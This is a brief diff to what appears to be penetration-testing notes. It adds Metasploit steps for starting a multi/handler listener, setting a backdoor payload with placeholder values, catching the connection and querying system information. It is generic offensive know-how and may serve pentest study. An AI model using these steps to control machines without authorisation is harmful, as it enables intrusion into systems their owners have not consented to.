@@ -19,4 +19,13 @@ set [parameter] [value]
 # generate backdoor
 generate
 
-# 
+# start listening
+msfconsole
+use exploit/multi/handler
+show options
+set PAYLOAD [payload of the backdoor]
+set [parameters] [value]
+exploit
+
+# after connection
+sysinfo     # system infomation
